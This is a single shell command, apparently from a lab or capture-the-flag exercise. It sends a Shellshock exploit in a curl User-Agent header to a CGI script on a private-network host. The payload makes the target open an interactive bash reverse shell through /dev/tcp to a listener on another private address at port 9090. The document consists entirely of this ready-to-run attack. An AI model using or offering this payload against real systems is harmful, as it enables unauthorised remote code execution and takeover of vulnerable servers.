curl -A "() { echo Hello;}; echo; /bin/bash -i > /dev/tcp/192.168.147.149/9090 0<&1 2>&1" http://192.168.147.150/cgi-bin/test.cgi
